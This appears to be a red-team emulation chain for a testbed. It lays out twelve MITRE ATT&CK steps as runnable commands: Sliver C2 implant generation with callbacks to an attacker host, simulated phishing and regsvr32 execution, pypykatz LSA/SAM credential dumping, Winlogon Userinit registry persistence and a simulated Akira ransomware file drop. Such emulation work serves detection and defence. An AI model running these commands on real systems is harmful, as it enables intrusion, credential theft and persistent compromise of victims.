# Chain 009

**Testbed**: `env0` · **Steps**: 12 · **Tactics touched**: Command and Control, Initial Access, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1087.001 |
| Credential Access | T1003.002 |
| Persistence | T1547.001 |
| Impact | T1486 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build DLL Sliver implant | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution | T1204.002 | Simulate the victim execute a DLL file on its machine | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1087.001 | User Context Verification | Sliver Executor |
| 6 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 7 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 8 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 9 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 10 | Credential Access | T1003.002 | Registry parse with pypykatz | Powershell Executor |
| 11 | Persistence | T1547.001 | HKLM - Append Command to Winlogon Userinit KEY Value | Powershell Executor |
| 12 | Impact | T1486 | Akira Ransomware drop Files with .akira Extension and Ransomnote | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build DLL Sliver implant

- **UUID**: `sliver-payload-windows-dll`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(dll-file ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim execute a DLL file on its machine

- **UUID**: `simulate-execute-dll-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim executes a DLL file on its machine.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, use PowerShell or Command Prompt)
regsvr32 #{DLL_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `DLL_PATH` | Saved path of the DLL file | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(dll-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — User Context Verification

- **UUID**: `sliver-whoami`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1087.001
- **Technique(s)**: Account Discovery: Local Account


**Description**

The `whoami` command retrieves the current user identity of the system. It executes the command on the remote system and returns the username of the account that is currently logged in. This command includes flag for setting a timeout.

**Execution** (Sliver Executor)

```
whoami(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(local-account-info-known ?target - host)`

---

### Step 6 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 7 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 8 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 9 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 10 — Registry parse with pypykatz

- **UUID**: `art-t1003_002-pypykatz-live-lsa`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`pypykatz live lsa` reads live LSA / SAM state and prints hashes and
cached secrets to stdout. Method 3 folds the heavy prereq chain
(install Python, create venv, pip install pypykatz) — this fold is
expensive on first run; realistic simulation envs would pre-provision
Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.

**Execution** (Powershell Executor)

```
$venv = "#{venv_path}"
if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  if (-not (Get-Command py -ErrorAction Ignore)) {
    $pySetup = "$env:TEMP\python_setup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
    Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
  }
  py -m venv $venv
  & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
}
& "$venv\Scripts\pypykatz.exe" live lsa
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke pypykatz. | — | yes |
| `venv_path` | Target-side path to a Python venv containing pypykatz. | C:\\Users\\Public\\venv_pypykatz | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 11 — HKLM - Append Command to Winlogon Userinit KEY Value

- **UUID**: `art-t1547_001-winlogon-userinit`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Appends a payload command to the Winlogon `Userinit` registry value
(`HKLM\...\Winlogon`) which is executed by every user's logon.
Backs up the original value under `Userinit-backup` before modifying.
Machine-scope, requires admin. ART auto_generated_guid
f7fab6cc-8ece-4ca7-a0f1-30a22fccd374.

**Execution** (Powershell Executor)

```
$oldvalue = Get-ItemPropertyValue -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue"
$newvalue = $oldvalue + " #{payload}"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to modify Winlogon Userinit. | — | yes |
| `payload` | Command / path appended to the Winlogon Userinit value. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 12 — Akira Ransomware drop Files with .akira Extension and Ransomnote

- **UUID**: `art-t1486-akira-ransomware-sim`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1486
- **Technique(s)**: Data Encrypted for Impact

**Description**

Simulates Akira ransomware post-encryption artefacts: writes 100
random-byte 1MB files with `.akira` extension to `C:\` and drops a
ransom note on the user's Desktop. Does not actually encrypt user
data — models the observable trail an incident responder would find.
Under aurora's "technique-attempted" positioning we accept this as
`data-encrypted` (the .akira files are the encrypted artefact from
the model's point of view). ART auto_generated_guid
ab3f793f-2dcc-4da5-9c71-34988307263f.

**Execution** (Powershell Executor)

```
1..#{file_count} | ForEach-Object {
  $out = New-Object byte[] 1073741
  (New-Object Random).NextBytes($out)
  [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
}
"Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
"Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to drop the .akira files and ransom note. | — | yes |
| `file_count` | Number of .akira artefact files to drop. | 100 | yes |
| `output_dir` | Target-side directory where .akira files are written. | C:\\Users\\Public | yes |
| `ransom_note_name` | Ransom-note filename dropped on the user's desktop. | akira_readme.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(data-encrypted ?d - data ?target - host)`

---
